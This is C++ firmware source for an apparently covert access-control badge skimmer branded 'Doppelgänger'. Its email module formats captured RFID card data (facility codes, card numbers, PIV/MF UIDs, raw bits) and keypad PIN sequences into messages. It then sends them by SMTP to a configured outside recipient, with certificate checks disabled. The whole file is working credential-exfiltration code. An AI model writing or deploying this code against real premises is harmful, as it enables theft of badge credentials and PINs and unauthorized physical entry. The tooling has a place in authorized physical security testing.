#include "email_manager.h"
#include "logger.h"
#include <base64.h>
#include <LittleFS.h>
#include <ArduinoJson.h>
#include <WiFiClientSecure.h>

// Define static members
bool EmailManager::enable_email = false;
char EmailManager::smtp_host[35] = "";
char EmailManager::smtp_user[35] = "";
char EmailManager::smtp_pass[35] = "";
char EmailManager::smtp_recipient[35] = "";
char EmailManager::smtp_port[5] = "465"; // Default SSL port

EmailManager::EmailManager() : is_configured(false), lastPinTime(0)
{
}

EmailManager::~EmailManager()
{
    if (emailTaskHandle != NULL)
    {
        vTaskDelete(emailTaskHandle);
    }
}

EmailManager &EmailManager::getInstance()
{
    static EmailManager instance;
    return instance;
}

void EmailManager::begin(const char *host, const char *port, const char *user, const char *pass, const char *recipient)
{
    if (!is_configured)
    {
        logger.log("[EMAIL] Email notifications are disabled or configuration failed");
        return;
    }

    // Convert port string to number
    char *endptr;
    uint16_t port_num = strtoul(port, &endptr, 10);
    if (port_num == 0 || *endptr != '\0')
    {
        logger.log("[EMAIL] Invalid SMTP port, using default 587");
        port_num = 587;
    }

    // Create email processing task with increased stack size
    xTaskCreate(
        emailTaskFunction,
        "EmailTask",
        16384, // Increased to 16KB stack
        this,
        1,
        &emailTaskHandle);

    logger.log("[EMAIL] Email notifications configured successfully");
}

bool EmailManager::sendCardData(uint8_t bitCount, uint32_t facilityCode, uint32_t cardNumber, const String &ssid, const String &binData, const String &csvHEX, const String &reversedPairsUID)
{
    if (!is_configured)
    {
        logger.log("[EMAIL] Email not configured");
        return false;
    }

    // Create email message
    EmailMessage msg;
    msg.type = EmailMessage::Type::CARD;
    msg.bitCount = bitCount;
    msg.facilityCode = facilityCode;
    msg.cardNumber = cardNumber;
    msg.ssid = ssid;
    msg.timestamp = time(nullptr);
    msg.binData = binData;
    msg.csvHEX = csvHEX;
    msg.reversedPairsUID = reversedPairsUID;

    // Format subject line
    if (bitCount == 32 && facilityCode >= 256)
    {
        msg.subject = "PIV/MF Card Read - UID: " + reversedPairsUID;
    }
    else
    {
        char subject[100];
        snprintf(subject, sizeof(subject), "Card Read: %d-bit, FC: %lu, CN: %lu",
                 bitCount, facilityCode, cardNumber);
        msg.subject = subject;
    }

    char timeStr[32];
    struct tm timeinfo;
    localtime_r(&msg.timestamp, &timeinfo);
    strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S %Z", &timeinfo);

    if (bitCount == 32 && facilityCode >= 256)
    {
        char body[1024];
        snprintf(body, sizeof(body),
                 "The following card data was captured at %s\n"
                 "------------------\n"
                 "Card Type: PIV/MF\n"
                 "HEX: %s\n"
                 "UID: %s\n"
                 "BIN Data: %s\n"
                 "------------------\n"
                 "This message was sent from a Doppelgänger device that was connected to %s",
                 timeStr, csvHEX.c_str(), reversedPairsUID.c_str(), binData.c_str(), ssid.c_str());
        msg.body = body;
    }
    else
    {
        // Standard card format
        char body[1024];
        snprintf(body, sizeof(body),
                 "The following card data was captured at %s\n"
                 "------------------\n"
                 "Bit Length: %d-bit\n"
                 "Facility Code: %lu\n"
                 "Card Number: %lu\n"
                 "BIN Data: %s\n"
                 "------------------\n"
                 "This message was sent from a Doppelgänger device that was connected to %s",
                 timeStr, bitCount, facilityCode, cardNumber, binData.c_str(), ssid.c_str());
        msg.body = body;
    }

    std::lock_guard<std::mutex> lock(queueMutex);
    messageQueue.push(msg);

    logger.log("[EMAIL] Card data queued for email");
    return true;
}

void EmailManager::emailTaskFunction(void *parameter)
{
    EmailManager *manager = static_cast<EmailManager *>(parameter);

    while (true)
    {
        if (manager->processNextEmail())
        {
            vTaskDelay(pdMS_TO_TICKS(1000));
        }
        else
        {
            // No email to process or error occurred
            vTaskDelay(pdMS_TO_TICKS(5000)); // Longer delay if no email
        }
    }
}

bool EmailManager::processNextEmail()
{
    std::lock_guard<std::mutex> lock(queueMutex);
    if (messageQueue.empty())
    {
        return false;
    }

    EmailMessage msg = messageQueue.front();
    messageQueue.pop();

    if (sendEmail(smtp_recipient, msg.subject.c_str(), msg.body.c_str()))
    {
        logger.log("[EMAIL] Email sent successfully");
        return true;
    }
    else
    {
        logger.log("[EMAIL] Failed to send email");
        return false;
    }
}

bool EmailManager::sendEmail(const char *to, const char *subject, const char *body)
{
    WiFiClientSecure client;
    client.setInsecure();  // Skip certificate verification for testing
    client.setTimeout(30); // Increase timeout to 30 seconds

    // Allocate log message on heap
    char *logMsg = new char[256];

    snprintf(logMsg, 256, "[EMAIL] Connecting to %s:%s", smtp_host, smtp_port);
    logger.log(logMsg);

    if (!client.connect(smtp_host, atoi(smtp_port)))
    {
        logger.log("[EMAIL] Failed to connect to SMTP server");
        delete[] logMsg;
        return false;
    }

    logger.log("[EMAIL] Connected to SMTP server");

    if (!waitForResponse(client, "220"))
    {
        logger.log("[EMAIL] No greeting from server");
        client.stop();
        delete[] logMsg;
        return false;
    }

    // Send EHLO instead of HELO for ESMTP
    String ehloCmd = String("EHLO ") + String(smtp_host);
    client.print(ehloCmd);
    client.print("\r\n");
    if (!waitForResponse(client, "250"))
    {
        logger.log("[EMAIL] EHLO failed");
        client.stop();
        delete[] logMsg;
        return false;
    }
    logger.log("[EMAIL] EHLO successful");

    // Send AUTH LOGIN
    logger.log("[EMAIL] Sending AUTH LOGIN");
    client.print("AUTH LOGIN\r\n");
    if (!waitForResponse(client, "334"))
    {
        logger.log("[EMAIL] AUTH LOGIN failed");
        client.stop();
        delete[] logMsg;
        return false;
    }
    logger.log("[EMAIL] AUTH LOGIN successful");

    // Send username (base64)
    String encodedUser = base64::encode(smtp_user);
    client.print(encodedUser);
    client.print("\r\n");
    if (!waitForResponse(client, "334"))
    {
        logger.log("[EMAIL] Username rejected");
        client.stop();
        delete[] logMsg;
        return false;
    }
    logger.log("[EMAIL] Username accepted");

    // Send password (base64)
    String encodedPass = base64::encode(smtp_pass);
    client.print(encodedPass);
    client.print("\r\n");
    if (!waitForResponse(client, "235"))
    {
        logger.log("[EMAIL] Password rejected");
        client.stop();
        delete[] logMsg;
        return false;
    }
    logger.log("[EMAIL] Password accepted");

    // Send MAIL FROM
    String mailFromCmd = String("MAIL FROM:<") + String(smtp_user) + String(">");
    client.print(mailFromCmd);
    client.print("\r\n");
    if (!waitForResponse(client, "250"))
    {
        logger.log("[EMAIL] MAIL FROM failed");
        client.stop();
        delete[] logMsg;
        return false;
    }
    logger.log("[EMAIL] MAIL FROM successful");

    // Send RCPT TO
    String rcptToCmd = String("RCPT TO:<") + String(to) + String(">");
    client.print(rcptToCmd);
    client.print("\r\n");
    if (!waitForResponse(client, "250"))
    {
        logger.log("[EMAIL] RCPT TO failed");
        client.stop();
        delete[] logMsg;
        return false;
    }
    logger.log("[EMAIL] RCPT TO successful");

    // Send DATA
    logger.log("[EMAIL] Sending DATA command");
    client.print("DATA\r\n");
    if (!waitForResponse(client, "354"))
    {
        logger.log("[EMAIL] DATA command failed");
        client.stop();
        delete[] logMsg;
        return false;
    }
    logger.log("[EMAIL] DATA command successful");

    // Send email headers and body
    logger.log("[EMAIL] Sending email headers and body");

    // Headers
    client.print("From: ");
    client.print(smtp_user);
    client.print("\r\n");

    client.print("To: ");
    client.print(to);
    client.print("\r\n");

    client.print("Subject: ");
    client.print(subject);
    client.print("\r\n");

    client.print("MIME-Version: 1.0\r\n");
    client.print("Content-Type: text/plain; charset=UTF-8\r\n");
    client.print("\r\n"); // Empty line between headers and body

    // Body
    client.print(body);
    client.print("\r\n");

    // End message
    client.print(".\r\n");

    if (!waitForResponse(client, "250"))
    {
        logger.log("[EMAIL] Message sending failed");
        client.stop();
        delete[] logMsg;
        return false;
    }
    logger.log("[EMAIL] Message sending successful");

    // Send QUIT
    logger.log("[EMAIL] Sending QUIT command");
    client.print("QUIT\r\n");
    if (!waitForResponse(client, "221"))
    {
        logger.log("[EMAIL] QUIT failed");
        client.stop();
        delete[] logMsg;
        return false;
    }
    logger.log("[EMAIL] QUIT successful");

    client.stop();
    logger.log("[EMAIL] Connection closed");
    delete[] logMsg;
    return true;
}

bool EmailManager::waitForResponse(WiFiClient &client, const char *expected, unsigned long timeout)
{
    unsigned long start = millis();
    String response = "";
    bool found = false;
    char logMsg[256]; // Stack-based buffer

    while (millis() - start < timeout)
    {
        if (client.available())
        {
            char c = client.read();
            response += c;

            if (c == '\n')
            {
                snprintf(logMsg, sizeof(logMsg), "[EMAIL] Received: %s", response.c_str());
                logger.log(logMsg);

                if (response.indexOf(expected) >= 0)
                {
                    found = true;
                    break;
                }
                response = "";
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    if (!found)
    {
        logger.log("[EMAIL] Timeout waiting for response");
        snprintf(logMsg, sizeof(logMsg), "[EMAIL] Last response: %s", response.c_str());
        logger.log(logMsg);
    }

    return found;
}

void EmailManager::sendPinData(const String &pinCode, const String &ssid, const String &binData)
{
    if (!is_configured)
    {
        return;
    }

    // Add minimum delay between PIN entries
    if (!pinBuffer.isEmpty() && (millis() - lastPinTime < 50))
    {
        delay(50); // Small delay to ensure reliable PIN entry
    }

    pinBuffer += pinCode;
    lastPinTime = millis();
}

void EmailManager::flushPinBuffer(const String &ssid)
{
    if (pinBuffer.isEmpty())
    {
        return;
    }

    // Add a small delay before flushing to ensure all PIN entries are captured
    delay(100);

    EmailMessage msg;
    msg.type = EmailMessage::Type::PIN;
    msg.pinCode = pinBuffer;
    msg.ssid = ssid;
    msg.timestamp = time(nullptr);

    // Format subject line
    msg.subject = "PIN Code Entry - Sequence: " + pinBuffer;

    // Format email body
    char timeStr[26];
    time_t now = time(nullptr);
    strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S UTC", gmtime(&now));

    msg.body = "The following PIN sequence was captured at ";
    msg.body += timeStr;
    msg.body += "\n------------------\n";
    msg.body += "Data Type: Keypad Entry\n";
    msg.body += "Sequence: " + pinBuffer + "\n";
    msg.body += "------------------\n";
    msg.body += "This message was sent from a Doppelgänger device that was connected to " + ssid + "\n";

    std::lock_guard<std::mutex> lock(queueMutex);
    messageQueue.push(msg);

    logger.log("[EMAIL] Added PIN sequence email to queue");

    pinBuffer = "";
    lastPinTime = 0;
}

void EmailManager::readConfig()
{
    Serial.println("======================================================================");
    Serial.println("[NOTIFICATION CONFIG] Loading notification preferences...");
    File file = LittleFS.open(NOTIFICATION_CONFIG_FILE, "r");
    if (!file)
    {
        Serial.println("[NOTIFICATION CONFIG] Failed to open configuration file");
        is_configured = false;
    }
    else
    {
        JsonDocument doc;
        DeserializationError error = deserializeJson(doc, file);
        file.close();

        if (error)
        {
            Serial.println("[NOTIFICATION CONFIG] Failed to parse configuration file");
            is_configured = false;
        }
        else
        {
            // Handle both string and boolean values for enable_email
            bool enable_email = false;
            if (doc["enable_email"].is<bool>())
            {
                enable_email = doc["enable_email"].as<bool>();
            }
            else if (doc["enable_email"].is<const char *>())
            {
                enable_email = strcmp(doc["enable_email"].as<const char *>(), "true") == 0;
            }

            if (enable_email)
            {
                strncpy(smtp_host, doc["smtp_host"], sizeof(smtp_host) - 1);
                strncpy(smtp_port, doc["smtp_port"], sizeof(smtp_port) - 1);
                strncpy(smtp_user, doc["smtp_user"], sizeof(smtp_user) - 1);
                strncpy(smtp_pass, doc["smtp_pass"], sizeof(smtp_pass) - 1);
                strncpy(smtp_recipient, doc["smtp_recipient"], sizeof(smtp_recipient) - 1);

                smtp_host[sizeof(smtp_host) - 1] = '\0';
                smtp_port[sizeof(smtp_port) - 1] = '\0';
                smtp_user[sizeof(smtp_user) - 1] = '\0';
                smtp_pass[sizeof(smtp_pass) - 1] = '\0';
                smtp_recipient[sizeof(smtp_recipient) - 1] = '\0';

                Serial.println("[NOTIFICATION CONFIG] Email notifications enabled");
                is_configured = true;
            }
            else
            {
                Serial.println("[NOTIFICATION CONFIG] Email notifications disabled");
                is_configured = false;
            }
        }
    }
}

void EmailManager::update()
{
    if (!pinBuffer.isEmpty() && (millis() - lastPinTime >= 2000))
    {
        flushPinBuffer(WiFi.SSID());
    }
}

EmailManager emailManager;